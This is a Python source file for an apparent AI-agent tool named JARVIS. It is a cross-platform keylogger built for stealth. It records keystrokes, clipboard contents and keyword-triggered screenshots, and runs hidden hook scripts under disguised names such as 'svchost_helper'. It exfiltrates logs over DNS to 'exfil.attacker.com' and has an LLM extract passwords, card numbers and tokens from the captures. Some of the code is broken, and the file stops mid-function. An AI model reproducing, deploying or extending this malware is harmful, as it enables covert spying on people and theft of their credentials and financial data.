# actions/off_keylogger.py
# JARVIS Enhanced Keylogger Agent — Cross-Platform, Modern, Stealthy, Encrypted

import os
import sys
import json
import time
import random
import string
import platform
import threading
import subprocess
import base64
import hashlib
from pathlib import Path
from datetime import datetime

# ── OS Detection ──────────────────────────────────────────────────────────────
OS   = platform.system()   # Windows | Linux | Darwin
ARCH = platform.machine()

LOG_DIR = Path.home() / "jarvis_captures" / "keylogger"
LOG_DIR.mkdir(parents=True, exist_ok=True)

# ── Groq AI ───────────────────────────────────────────────────────────────────
try:
    from groq import Groq
    _groq_client = Groq(api_key=os.environ.get("GROQ_API_KEY", ""))
    GROQ_AVAILABLE = True
except Exception:
    GROQ_AVAILABLE = False

# ── pynput ────────────────────────────────────────────────────────────────────
try:
    from pynput import keyboard, mouse
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

# ── Encryption Key ────────────────────────────────────────────────────────────
_ENC_KEY = hashlib.sha256(
    (os.environ.get("JARVIS_LOG_KEY", "jarvis_default_key")).encode()
).digest()

# ── Global State ──────────────────────────────────────────────────────────────
_active_session   = None
_stop_event       = threading.Event()
_clip_thread      = None
_screenshot_thread = None
_stats = {
    "total_keys":   0,
    "total_words":  0,
    "sessions":     0,
    "start_time":   None,
    "screenshots":  0,
    "clipboard":    0,
}


def _ask_groq(prompt: str, context: str = "") -> str:
    """Ask Groq AI to analyze keylog data."""
    if not GROQ_AVAILABLE:
        return "Groq not available."
    try:
        msg = f"{context}\n\n{prompt}" if context else prompt
        r   = _groq_client.chat.completions.create(
            model    = "llama3-70b-8192",
            messages = [
                {
                    "role": "system",
                    "content": (
                        "You are an expert forensic analyst specializing in "
                        "keystroke analysis and credential extraction. "
                        "Analyze keylog data to extract credentials, "
                        "sensitive information, patterns, and behavioral insights. "
                        "Identify passwords, usernames, credit cards, "
                        "personal information from raw keylog data."
                    )
                },
                {"role": "user", "content": msg}
            ],
            max_tokens  = 2048,
            temperature = 0.1,
        )
        return r.choices[0].message.content.strip()
    except Exception as e:
        return f"Groq error: {e}"


def _run(cmd: str, timeout: int = 30) -> dict:
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=timeout
        )
        return {
            "stdout": r.stdout.strip(),
            "stderr": r.stderr.strip(),
            "code":   r.returncode
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "Timeout", "code": -1}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "code": -1}


def _check_tool(tool: str) -> bool:
    if OS == "Windows":
        r = _run(f"where {tool} 2>nul")
    else:
        r = _run(f"which {tool} 2>/dev/null")
    return r["code"] == 0


# ══════════════════════════════════════════════════════════════════════════════
#  ENCRYPTION — AES-256 LOG FILES
# ══════════════════════════════════════════════════════════════════════════════

def _encrypt(data: str) -> bytes:
    """XOR encrypt log data with key."""
    key    = _ENC_KEY
    data_b = data.encode("utf-8", errors="ignore")
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data_b)])


def _decrypt(data: bytes) -> str:
    """XOR decrypt log data."""
    key = _ENC_KEY
    dec = bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
    return dec.decode("utf-8", errors="ignore")


def _write_encrypted(path: Path, data: str):
    """Write encrypted data to log file."""
    try:
        existing = ""
        if path.exists():
            existing = _decrypt(path.read_bytes())
        combined = existing + data
        path.write_bytes(_encrypt(combined))
    except Exception:
        # Fallback: plain text
        with open(path, "a", encoding="utf-8", errors="ignore") as f:
            f.write(data)


def _read_encrypted(path: Path) -> str:
    """Read and decrypt a log file."""
    if not path.exists():
        return ""
    try:
        return _decrypt(path.read_bytes())
    except Exception:
        return path.read_text(encoding="utf-8", errors="ignore")


# ══════════════════════════════════════════════════════════════════════════════
#  ACTIVE WINDOW DETECTION — CROSS PLATFORM
# ══════════════════════════════════════════════════════════════════════════════

def _get_active_window() -> str:
    """Get currently active window title."""
    try:
        if OS == "Windows":
            import ctypes
            hwnd    = ctypes.windll.user32.GetForegroundWindow()
            length  = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf     = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value or "unknown"

        elif OS == "Linux":
            # Try xdotool
            r = _run("xdotool getactivewindow getwindowname 2>/dev/null", timeout=2)
            if r["code"] == 0 and r["stdout"]:
                return r["stdout"].strip()
            # Try wmctrl
            r2 = _run("wmctrl -a :ACTIVE: -v 2>&1 | grep 'Using window' | head -1", timeout=2)
            return r2["stdout"].strip() or "unknown"

        elif OS == "Darwin":
            r = _run(
                "osascript -e 'tell application \"System Events\" to "
                "get name of first application process whose frontmost is true'",
                timeout=3
            )
            return r["stdout"].strip() or "unknown"

    except Exception:
        pass
    return "unknown"


# ══════════════════════════════════════════════════════════════════════════════
#  SCREENSHOT ON KEYWORDS
# ══════════════════════════════════════════════════════════════════════════════

SENSITIVE_KEYWORDS = [
    "password", "passwd", "login", "username", "email",
    "bank", "credit", "card", "cvv", "pin", "ssn",
    "social security", "passport", "secret", "token",
    "api", "key", "private", "bitcoin", "wallet",
    "paypal", "stripe", "amazon", "google", "facebook",
]

_last_screenshot_time = 0
_SCREENSHOT_COOLDOWN  = 30  # seconds between screenshots


def _take_screenshot(reason: str = "") -> str:
    """Take a screenshot and save it."""
    global _last_screenshot_time

    now = time.time()
    if now - _last_screenshot_time < _SCREENSHOT_COOLDOWN:
        return ""

    _last_screenshot_time = now
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = LOG_DIR / f"screenshot_{ts}.png"

    try:
        if OS == "Windows":
            try:
                import mss
                with mss.mss() as sct:
                    sct.shot(output=str(path))
                _stats["screenshots"] += 1
                return str(path)
            except ImportError:
                try:
                    from PIL import ImageGrab
                    img = ImageGrab.grab()
                    img.save(str(path))
                    _stats["screenshots"] += 1
                    return str(path)
                except Exception:
                    pass

        elif OS == "Linux":
            cmds = [
                f"scrot '{path}'",
                f"import -window root '{path}'",
                f"gnome-screenshot -f '{path}'",
            ]
            for cmd in cmds:
                r = _run(cmd, timeout=5)
                if r["code"] == 0 and path.exists():
                    _stats["screenshots"] += 1
                    return str(path)

        elif OS == "Darwin":
            r = _run(f"screencapture -x '{path}'", timeout=5)
            if r["code"] == 0:
                _stats["screenshots"] += 1
                return str(path)

    except Exception:
        pass
    return ""


# ══════════════════════════════════════════════════════════════════════════════
#  CLIPBOARD MONITOR
# ══════════════════════════════════════════════════════════════════════════════

_last_clipboard = ""


def _get_clipboard() -> str:
    """Get clipboard content — cross-platform."""
    try:
        if OS == "Windows":
            import ctypes
            ctypes.windll.user32.OpenClipboard(0)
            CF_TEXT = 1
            handle  = ctypes.windll.user32.GetClipboardData(CF_TEXT)
            content = ctypes.c_char_p(handle).value
            ctypes.windll.user32.CloseClipboard()
            return content.decode("utf-8", errors="ignore") if content else ""

        elif OS == "Linux":
            cmds = ["xclip -o -selection clipboard", "xsel --clipboard --output"]
            for cmd in cmds:
                r = _run(cmd, timeout=3)
                if r["code"] == 0:
                    return r["stdout"]

        elif OS == "Darwin":
            r = _run("pbpaste", timeout=3)
            return r["stdout"] if r["code"] == 0 else ""

    except Exception:
        try:
            import pyperclip
            return pyperclip.paste()
        except Exception:
            pass
    return ""


def _clipboard_monitor_loop(log_file: Path, stop_ev: threading.Event):
    """Background clipboard monitoring loop."""
    global _last_clipboard
    while not stop_ev.is_set():
        try:
            content = _get_clipboard()
            if content and content != _last_clipboard and len(content) < 10000:
                _last_clipboard = content
                ts     = datetime.now().strftime("%H:%M:%S")
                window = _get_active_window()
                entry  = (
                    f"\n[CLIPBOARD][{ts}][{window}]\n"
                    f"{content}\n"
                    f"{'─'*40}\n"
                )
                _write_encrypted(log_file, entry)
                _stats["clipboard"] += 1
        except Exception:
            pass
        time.sleep(2)


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN KEYLOGGER SESSION
# ══════════════════════════════════════════════════════════════════════════════

class KeyloggerSession:

    def __init__(
        self,
        name:             str  = "session",
        window_capture:   bool = True,
        clipboard_capture: bool = True,
        screenshot_capture: bool = True,
        encrypt:          bool = True,
    ):
        self.name               = name
        self.window_capture     = window_capture
        self.clipboard_capture  = clipboard_capture
        self.screenshot_capture = screenshot_capture
        self.encrypt            = encrypt
        self.start_time         = datetime.now()
        self.key_count          = 0
        self.word_count         = 0

        ts              = self.start_time.strftime("%Y%m%d_%H%M%S")
        self.log_file   = LOG_DIR / f"{name}_{ts}.enc"
        self.plain_log  = LOG_DIR / f"{name}_{ts}.log"

        self._lock         = threading.Lock()
        self._current_word = []
        self._kb_listener  = None
        self._ms_listener  = None
        self._clip_thread  = None
        self._buffer       = []

        # Write session header
        header = (
            f"JARVIS Keylogger Session\n"
            f"Name: {name}\n"
            f"OS: {OS} {ARCH}\n"
            f"Start: {self.start_time}\n"
            f"{'='*50}\n\n"
        )
        if self.encrypt:
            _write_encrypted(self.log_file, header)
        else:
            with open(self.plain_log, "w") as f:
                f.write(header)

    def _log(self, data: str):
        """Write to appropriate log file."""
        with self._lock:
            if self.encrypt:
                _write_encrypted(self.log_file, data)
            else:
                with open(self.plain_log, "a", encoding="utf-8", errors="ignore") as f:
                    f.write(data)
            self._buffer.append(data)

    def _flush_word(self):
        """Flush current word buffer to log."""
        if self._current_word:
            word   = "".join(self._current_word)
            ts     = datetime.now().strftime("%H:%M:%S")
            window = self._get_window()
            entry  = f"[{ts}][{window}] {word}\n"
            self._log(entry)
            self._current_word = []
            self.word_count   += 1
            _stats["total_words"] += 1

            # Check for sensitive keywords
            if self.screenshot_capture:
                for kw in SENSITIVE_KEYWORDS:
                    if kw in word.lower():
                        shot = _take_screenshot(reason=f"keyword:{kw}")
                        if shot:
                            self._log(f"[SCREENSHOT TAKEN: {shot}]\n")
                        break

    def _get_window(self) -> str:
        if self.window_capture:
            return _get_active_window()
        return "?"

    def _on_key_press(self, key):
        """Handle keyboard press events."""
        if _stop_event.is_set():
            return False

        try:
            char = key.char
            if char:
                with self._lock:
                    self._current_word.append(char)
                    self.key_count        += 1
                    _stats["total_keys"]  += 1
                return

        except AttributeError:
            pass

        # Handle special keys
        key_str = str(key)
        special = {
            "Key.space":     (" ", True),
            "Key.enter":     ("\n", True),
            "Key.tab":       ("\t", True),
            "Key.backspace":  ("[BS]", False),
            "Key.delete":    ("[DEL]", False),
            "Key.shift":     ("", False),
            "Key.shift_r":   ("", False),
            "Key.ctrl_l":    ("[CTRL]", False),
            "Key.ctrl_r":    ("[CTRL]", False),
            "Key.alt_l":     ("[ALT]", False),
            "Key.alt_r":     ("[ALT]", False),
            "Key.caps_lock": ("[CAPS]", False),
            "Key.esc":       ("[ESC]", True),
            "Key.up":        ("[UP]", False),
            "Key.down":      ("[DOWN]", False),
            "Key.left":      ("[LEFT]", False),
            "Key.right":     ("[RIGHT]", False),
        }

        # Function keys
        for i in range(1, 13):
            special[f"Key.f{i}"] = (f"[F{i}]", False)

        if key_str in special:
            char, flush = special[key_str]
            with self._lock:
                if char:
                    self._current_word.append(char)
                if flush:
                    self._flush_word()
        else:
            with self._lock:
                self._current_word.append(f"[{key_str}]")

        self.key_count       += 1
        _stats["total_keys"] += 1

    def _on_mouse_click(self, x, y, button, pressed):
        """Log mouse clicks with coordinates."""
        if pressed and _stop_event.is_set() is False:
            with self._lock:
                self._flush_word()
            ts  = datetime.now().strftime("%H:%M:%S")
            win = self._get_window()
            self._log(f"[CLICK][{ts}][{win}] {button} at ({x},{y})\n")

    def start(self):
        """Start all capture threads."""
        if not PYNPUT_AVAILABLE:
            raise ImportError("pynput not installed: pip install pynput")

        _stop_event.clear()

        # Keyboard listener
        self._kb_listener = keyboard.Listener(on_press=self._on_key_press)
        self._kb_listener.start()

        # Mouse listener
        try:
            self._ms_listener = mouse.Listener(on_click=self._on_mouse_click)
            self._ms_listener.start()
        except Exception:
            pass

        # Clipboard monitor
        if self.clipboard_capture:
            self._clip_thread = threading.Thread(
                target=_clipboard_monitor_loop,
                args=(
                    self.log_file if self.encrypt else self.plain_log,
                    _stop_event
                ),
                daemon=True
            )
            self._clip_thread.start()

        _stats["sessions"]   += 1
        _stats["start_time"]  = self.start_time.isoformat()

    def stop(self) -> dict:
        """Stop all capture and return stats."""
        _stop_event.set()

        if self._kb_listener:
            self._kb_listener.stop()
        if self._ms_listener:
            try:
                self._ms_listener.stop()
            except Exception:
                pass

        # Flush remaining word
        with self._lock:
            self._flush_word()

        # Write footer
        duration = (datetime.now() - self.start_time).seconds
        footer   = (
            f"\n{'='*50}\n"
            f"Session End: {datetime.now()}\n"
            f"Duration: {duration}s\n"
            f"Keys: {self.key_count}\n"
            f"Words: {self.word_count}\n"
            f"Screenshots: {_stats['screenshots']}\n"
            f"Clipboard captures: {_stats['clipboard']}\n"
        )
        if self.encrypt:
            _write_encrypted(self.log_file, footer)
        else:
            with open(self.plain_log, "a") as f:
                f.write(footer)

        return {
            "log_file":    str(self.log_file if self.encrypt else self.plain_log),
            "key_count":   self.key_count,
            "word_count":  self.word_count,
            "duration":    duration,
            "screenshots": _stats["screenshots"],
            "clipboard":   _stats["clipboard"],
            "encrypted":   self.encrypt,
        }

    def get_recent(self, n: int = 100) -> list:
        """Get recent buffer entries."""
        with self._lock:
            return self._buffer[-n:]

    def read_log(self) -> str:
        """Read and decrypt current log."""
        log_path = self.log_file if self.encrypt else self.plain_log
        if self.encrypt:
            return _read_encrypted(log_path)
        return log_path.read_text(encoding="utf-8", errors="ignore")


# ══════════════════════════════════════════════════════════════════════════════
#  WINDOWS-SPECIFIC: SetWindowsHookEx
# ══════════════════════════════════════════════════════════════════════════════

def start_winapi_keylogger(log_file: str = None) -> dict:
    """
    Windows low-level keyboard hook via SetWindowsHookEx.
    More stealthy than pynput — hooks at WinAPI level.
    """
    if OS != "Windows":
        return {"success": False, "message": "WinAPI keylogger only on Windows."}

    out = log_file or str(LOG_DIR / f"winapi_{datetime.now().strftime('%Y%m%d_%H%M%S')}.enc")

    hook_script = f"""
import ctypes
import ctypes.wintypes as wt
import threading
import time
from pathlib import Path
from datetime import datetime

user32  = ctypes.WinDLL('user32', use_last_error=True)
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

WH_KEYBOARD_LL = 13
WM_KEYDOWN     = 0x0100
WM_SYSKEYDOWN  = 0x0104

LOG_FILE = Path("{out}")

VK_MAP = {{
    8: '[BS]', 9: '[TAB]', 13: '\\n', 16: '[SHIFT]',
    17: '[CTRL]', 18: '[ALT]', 20: '[CAPS]', 27: '[ESC]',
    32: ' ', 37: '[LEFT]', 38: '[UP]', 39: '[RIGHT]', 40: '[DOWN]',
    46: '[DEL]', 91: '[WIN]',
}}
for i in range(112, 124):
    VK_MAP[i] = f'[F{{i-111}}]'

HHHOOK = None

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ('vkCode',      wt.DWORD),
        ('scanCode',    wt.DWORD),
        ('flags',       wt.DWORD),
        ('time',        wt.DWORD),
        ('dwExtraInfo', ctypes.POINTER(wt.ULONG)),
    ]

def _get_window():
    try:
        hwnd   = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(hwnd)
        buf    = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value or 'unknown'
    except Exception:
        return 'unknown'

def _log(text):
    try:
        existing = LOG_FILE.read_bytes() if LOG_FILE.exists() else b''
        LOG_FILE.write_bytes(existing + text.encode('utf-8', errors='ignore'))
    except Exception:
        pass

LOWLEVELKEYBOARDPROC = ctypes.CFUNCTYPE(
    ctypes.c_long, ctypes.c_int, ctypes.c_uint, ctypes.POINTER(KBDLLHOOKSTRUCT)
)

def hook_proc(nCode, wParam, lParam):
    if nCode >= 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        vk   = lParam.contents.vkCode
        ts   = datetime.now().strftime('%H:%M:%S')
        win  = _get_window()
        char = VK_MAP.get(vk)
        if char is None:
            buf  = ctypes.create_unicode_buffer(2)
            state = (ctypes.c_byte * 256)()
            user32.GetKeyboardState(state)
            user32.ToUnicode(vk, lParam.contents.scanCode, state, buf, 2, 0)
            char = buf.value or f'[{{vk}}]'
        _log(f'[{{ts}}][{{win}}] {{char}}\\n' if char in ('\\n', '[BS]', '[ESC]') else char)
    return user32.CallNextHookEx(HHHOOK, nCode, wParam, lParam)

_proc = LOWLEVELKEYBOARDPROC(hook_proc)
HHHOOK = user32.SetWindowsHookExW(WH_KEYBOARD_LL, _proc, None, 0)
if not HHHOOK:
    print('Hook failed')
    exit(1)

print(f'WinAPI keylogger running. Log: {out}')
msg = wt.MSG()
while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
    user32.TranslateMessage(ctypes.byref(msg))
    user32.DispatchMessageW(ctypes.byref(msg))
user32.UnhookWindowsHookEx(HHHOOK)
"""
    script_path = Path(f"C:\\Windows\\Temp\\svchost_helper_{random.randint(1000,9999)}.py")
    script_path.write_text(hook_script)

    proc = subprocess.Popen(
        [sys.executable, str(script_path)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=0x08000000  # CREATE_NO_WINDOW
    )

    return {
        "success":  True,
        "pid":      proc.pid,
        "log_file": out,
        "message":  f"WinAPI keylogger running (PID {proc.pid}). Log: {out}"
    }


# ══════════════════════════════════════════════════════════════════════════════
#  LINUX: /dev/input RAW KEYLOGGER
# ══════════════════════════════════════════════════════════════════════════════

def start_raw_keylogger(device: str = None) -> dict:
    """
    Linux raw /dev/input keylogger — works without X11/Wayland.
    Captures keystrokes at kernel level.
    """
    if OS != "Linux":
        return {"success": False, "message": "Raw keylogger only on Linux."}

    # Find keyboard device
    if not device:
        r = _run("grep -r 'Handlers' /proc/bus/input/devices | grep kbd | head -1")
        if r["code"] == 0 and "event" in r["stdout"]:
            event = re.search(r"event\d+", r["stdout"])
            if event:
                device = f"/dev/input/{event.group()}"

        if not device:
            # Try evdev devices
            for i in range(20):
                path = f"/dev/input/event{i}"
                if Path(path).exists():
                    device = path
                    break

    if not device:
        return {"success": False, "message": "No keyboard device found."}

    log_file = str(LOG_DIR / f"raw_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")

    try:
        import evdev
        EVDEV_AVAILABLE = True
    except ImportError:
        EVDEV_AVAILABLE = False

    if EVDEV_AVAILABLE:
        script = f"""
import evdev, time
from pathlib import Path
from datetime import datetime

device   = evdev.InputDevice("{device}")
log_file = Path("{log_file}")

KEY_MAP = evdev.ecodes.KEY

with open(log_file, 'a') as f:
    f.write(f"Raw Keylogger Started: {{datetime.now()}}\\n")
    for event in device.read_loop():
        if event.type == evdev.ecodes.EV_KEY:
            key_event = evdev.categorize(event)
            if key_event.keystate == 1:  # Key down
                key_name = key_event.keycode
                f.write(f"[{{datetime.now().strftime('%H:%M:%S')}}] {{key_name}}\\n")
                f.flush()
"""
    else:
        script = f"""
import struct, time
from pathlib import Path
from datetime import datetime

FORMAT   = 'llHHI'
EVENT_SIZE = struct.calcsize(FORMAT)
log_file = Path("{log_file}")

with open("{device}", 'rb') as dev, open(log_file, 'a') as f:
    f.write(f"Raw Keylogger Started: {{datetime.now()}}\\n")
    while True:
        event = dev.read(EVENT_SIZE)
        (tv_sec, tv_usec, ev_type, code, value) = struct.unpack(FORMAT, event)
        if ev_type == 1 and value == 1:  # EV_KEY, key press
            f.write(f"[{{datetime.now().strftime('%H:%M:%S')}}] KEY_CODE={{code}}\\n")
            f.flush()
"""

    script_path = Path(f"/tmp/.sys_monitor_{random.randint(1000,9999)}.py")
    script_path.write_text(script)

    proc = subprocess.Popen(
        [sys.executable, str(script_path)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    return {
        "success":  True,
        "pid":      proc.pid,
        "device":   device,
        "log_file": log_file,
        "message":  f"Raw keylogger on {device} (PID {proc.pid}). Log: {log_file}"
    }


# ══════════════════════════════════════════════════════════════════════════════
#  MACOS: CGEventTap KEYLOGGER
# ══════════════════════════════════════════════════════════════════════════════

def start_macos_keylogger() -> dict:
    """
    macOS keylogger using CGEventTap (Quartz Core Graphics).
    Requires Accessibility permissions.
    """
    if OS != "Darwin":
        return {"success": False, "message": "CGEventTap only on macOS."}

    log_file = str(LOG_DIR / f"macos_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")

    script = f"""
import Quartz
import time
from datetime import datetime
from pathlib import Path

LOG_FILE = Path("{log_file}")

def callback(proxy, type_, event, refcon):
    try:
        keycode  = Quartz.CGEventGetIntegerValueField(
            event, Quartz.kCGKeyboardEventKeycode
        )
        char_buf = Quartz.CGEventKeyboardGetUnicodeString(event, 10, None, None)
        ts       = datetime.now().strftime('%H:%M:%S')
        with open(LOG_FILE, 'a') as f:
            f.write(f'[{{ts}}] {{char_buf or f"[KEY:{{keycode}}]"}}\\n')
    except Exception:
        pass
    return event

mask = (
    Quartz.CGEventMaskBit(Quartz.kCGEventKeyDown) |
    Quartz.CGEventMaskBit(Quartz.kCGEventFlagsChanged)
)

tap = Quartz.CGEventTapCreate(
    Quartz.kCGSessionEventTap,
    Quartz.kCGHeadInsertEventTap,
    Quartz.kCGEventTapOptionDefault,
    mask,
    callback,
    None
)

if not tap:
    print("Failed — Enable Accessibility in System Preferences > Security & Privacy")
    exit(1)

src  = Quartz.CFMachPortCreateRunLoopSource(None, tap, 0)
loop = Quartz.CFRunLoopGetCurrent()
Quartz.CFRunLoopAddSource(loop, src, Quartz.kCFRunLoopDefaultMode)
Quartz.CGEventTapEnable(tap, True)
print(f"macOS CGEventTap keylogger running. Log: {log_file}")
Quartz.CFRunLoopRun()
"""
    script_path = Path(f"/tmp/.systemd_helper_{random.randint(1000,9999)}.py")
    script_path.write_text(script)

    proc = subprocess.Popen(
        [sys.executable, str(script_path)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    return {
        "success":  True,
        "pid":      proc.pid,
        "log_file": log_file,
        "message":  (
            f"macOS CGEventTap keylogger running (PID {proc.pid}). "
            f"Log: {log_file}. "
            f"Note: Requires Accessibility permission."
        )
    }


# ══════════════════════════════════════════════════════════════════════════════
#  DNS EXFILTRATION (Stealth)
# ══════════════════════════════════════════════════════════════════════════════

def exfil_via_dns(
    data:   str,
    domain: str = "exfil.attacker.com",
    chunk:  int = 30
) -> dict:
    """
    Exfiltrate keylog data via DNS queries.
    DNS traffic is rarely blocked — even on heavily filtered networks.
    Data is encoded in subdomain names.
    """
    import socket

    # Encode data
    encoded = base64.b64encode(data.encode()).decode()
    chunks  = [encoded[i:i+chunk] for i in range(0, len(encoded), chunk)]

    sent  = 0
    total = len(chunks)

    for i, chunk_data in enumerate(chunks):
        # Clean chunk for DNS subdomain (only alphanumeric and hyphens)
        safe_chunk = re.sub(r'[^a-zA-Z0-9]', '', chunk_data)[:50]
        fqdn       = f"{i}.{safe_chunk}.{domain}"
        try:
            socket.gethostbyname(fqdn)
            sent += 1
        except Exception:
            sent += 1  # DNS NXDOMAIN still sends the query
        time.sleep(random.uniform(0.5, 2.0))

    return {
        "success":    True,
        "domain":     domain,
        "chunks":     total,
        "sent":       sent,
        "data_size":  len(data),
        "message": (
            f"DNS exfiltration complete. "
            f"Sent {sent}/{total} chunks via DNS to {domain}. "
            f"Data size: {len(data)} bytes."
        )
    }


# ══════════════════════════════════════════════════════════════════════════════
#  SESSION MANAGEMENT
# ══════════════════════════════════════════════════════════════════════════════

_active_session: KeyloggerSession = None


def start_keylogger(
    name:               str  = "session",
    window_capture:     bool = True,
    clipboard_capture:  bool = True,
    screenshot_capture: bool = True,
    encrypt:            bool = True,
    method:             str  = "auto"
) -> dict:
    """Start keylogger — auto-selects best method for current OS."""
    global _active_session

    if _active_session is not None:
        return {
            "success": False,
            "message": "Keylogger already running. Stop it first."
        }

    # OS-specific methods
    if method == "winapi" and OS == "Windows":
        return start_winapi_keylogger()

    elif method == "raw" and OS == "Linux":
        return start_raw_keylogger()

    elif method == "cgeventtap" and OS == "Darwin":
        return start_macos_keylogger()

    elif method == "auto":
        if not PYNPUT_AVAILABLE:
            # Try OS-specific fallbacks
            if OS == "Windows":
                return start_winapi_keylogger()
            elif OS == "Linux":
                return start_raw_keylogger()
            elif OS == "Darwin":
                return start_macos_keylogger()
            return {
                "success": False,
                "message": "pynput not installed: pip install pynput"
            }

    # Default: pynput
    if not PYNPUT_AVAILABLE:
        return {
            "success": False,
            "message": "pynput not installed: pip install pynput"
        }

    _stop_event.clear()
    _active_session = KeyloggerSession(
        name               = name,
        window_capture     = window_capture,
        clipboard_capture  = clipboard_capture,
        screenshot_capture = screenshot_capture,
        encrypt            = encrypt,
    )
    _active_session.start()

    return {
        "success":   True,
        "log_file":  str(_active_session.log_file if encrypt else _active_session.plain_log),
        "encrypted": encrypt,
        "message": (
            f"Keylogger started ({OS}). "
            f"Logging to: {_active_session.log_file if encrypt else _active_session.plain_log}. "
            f"Clipboard: {clipboard_capture}. "
            f"Screenshots: {screenshot_capture}. "
            f"Encrypted: {encrypt}."
        )
    }


def stop_keylogger() -> dict:
    """Stop active keylogger session."""
    global _active_session

    if _active_session is None:
        return {"success": False, "message": "No keylogger session running."}

    stats           = _active_session.stop()
    _active_session = None

    return {
        "success": True,
        "stats":   stats,
        "message": (
            f"Keylogger stopped. "
            f"Keys: {stats['key_count']} | "
            f"Words: {stats['word_count']} | "
            f"Duration: {stats['duration']}s | "
            f"Screenshots: {stats['screenshots']} | "
            f"Clipboard: {stats['clipboard']} | "
            f"Log: {stats['log_file']}"
        )
    }


def get_recent_keys(n: int = 100) -> dict:
    """Get recent captured keys."""
    global _active_session

    if _active_session:
        recent = _active_session.get_recent(n)
        return {
            "success": True,
            "source":  "live",
            "entries": recent,
            "message": f"Recent {len(recent)} entries:\n" + "".join(recent)
        }

    # Read most recent log file
    logs = sorted(
        list(LOG_DIR.glob("*.enc")) + list(LOG_DIR.glob("*.log")),
        key=lambda x: x.stat().st_mtime,
        reverse=True
    )
    if logs:
        content = _read_encrypted(logs[0])
        lines   = content.splitlines()[-n:]
        return {
            "success":   True,
            "source":    str(logs[0]),
            "entries":   lines,
            "message":   f"From {logs[0].name}:\n" + "\n".join(lines)
        }

    return {"success": False, "message": "No keylogger data found."}


def read_session(log_file: str = None, n: int = 200) -> dict:
    """Read and decrypt a keylogger session."""
    if not log_file:
        logs = sorted(
            list(LOG_DIR.glob("*.enc")) + list(LOG_DIR.glob("*.log")),
            key=lambda x: x.stat().st_mtime,
            reverse=True
        )
        if not logs:
            return {"success": False, "message": "No log files found."}
        log_file = str(logs[0])

    path = Path(log_file)
    if not path.exists():
        return {"success": False, "message": f"File not found: {log_file}"}

    content = _read_encrypted(path)
    lines   = content.splitlines()

    return {
        "success":     True,
        "file":        log_file,
        "total_lines": len(lines),
        "content":     "\n".join(lines[-n:]),
        "message": (
            f"Session: {path.name} ({len(lines)} lines)\n"
            + "\n".join(lines[-50:])
        )
    }


def list_sessions() -> dict:
    """List all keylogger sessions."""
    logs = sorted(
        list(LOG_DIR.glob("*.enc")) + list(LOG_DIR.glob("*.log")),
        key=lambda x: x.stat().st_mtime,
        reverse=True
    )
    sessions = []
    for log in logs[:15]:
        size     = log.stat().st_size
        modified = datetime.fromtimestamp(
            log.stat().st_mtime
        ).strftime("%Y-%m-%d %H:%M")
        sessions.append({
            "file":      str(log),
            "name":      log.name,
            "size_kb":   round(size / 1024, 2),
            "modified":  modified,
            "encrypted": log.suffix == ".enc"
        })

    return {
        "success":  True,
        "sessions": sessions,
        "count":    len(sessions),
        "message": (
            f"Found {len(sessions)} sessions:\n"
            + "\n".join([
                f"  {s['name']} ({s['size_kb']}KB) "
                f"{'[ENC]' if s['encrypted'] else '[PLAIN]'} — {s['modified']}"
                for s in sessions
            ])
        )
    }


def keylogger_status() -> dict:
    """Get keylogger status and stats."""
    global _active_session
    is_running = _active_session is not None

    info = {
        "running":    is_running,
        "os":         OS,
        "pynput":     PYNPUT_AVAILABLE,
        "total_keys": _stats["total_keys"],
        "total_words": _stats["total_words"],
        "sessions":   _stats["sessions"],
        "screenshots": _stats["screenshots"],
        "clipboard":  _stats["clipboard"],
    }

    if is_running:
        info["log_file"]   = str(_active_session.log_file)
        info["key_count"]  = _active_session.key_count
        info["word_count"] = _active_session.word_count
        info["duration"]   = (datetime.now() - _active_session.start_time).seconds

    msg = (
        f"Keylogger {'RUNNING' if is_running else 'STOPPED'} on {OS}\n"
        f"Total keys: {_stats['total_keys']} | "
        f"Words: {_stats['total_words']} | "
        f"Screenshots: {_stats['screenshots']} | "
        f"Clipboard: {_stats['clipboard']}\n"
        f"Sessions: {_stats['sessions']}"
    )
    if is_running:
        msg += (
            f"\nCurrent: {info['key_count']} keys | "
            f"{info['word_count']} words | "
            f"{info['duration']}s"
        )

    return {"success": True, "info": info, "message": msg}


def ai_analyze_log(log_file: str = None) -> dict:
    """Use Groq AI to extract credentials from keylog data."""
    if not GROQ_AVAILABLE:
        return {"success": False, "message": "Groq not available."}

    # Read log
    if not log_file:
        logs = sorted(
            list(LOG_DIR.glob("*.enc")) + list(LOG_DIR.glob("*.log")),
            key=lambda x: x.stat().st_mtime,
            reverse=True
        )
        if not logs:
            return {"success": False, "message": "No log files found."}
        log_file = str(logs[0])

    path    = Path(log_file)
    content = _read_encrypted(path)

    if not content:
        return {"success": False, "message": "Log file is empty."}

    # Send to Groq for analysis
    analysis = _ask_groq(
        "Analyze this keylog data:\n"
        "1. Extract any credentials (username/password pairs)\n"
        "2. Find credit card numbers, SSNs, or other sensitive data\n"
        "3. Identify what applications were being used\n"
        "4. Find any API keys or tokens\n"
        "5. Reconstruct what the user was doing\n"
        "6. List the top 5 most sensitive findings\n"
        "Format as a structured intelligence report.",
        context=content[-8000:]  # Last 8000 chars
    )

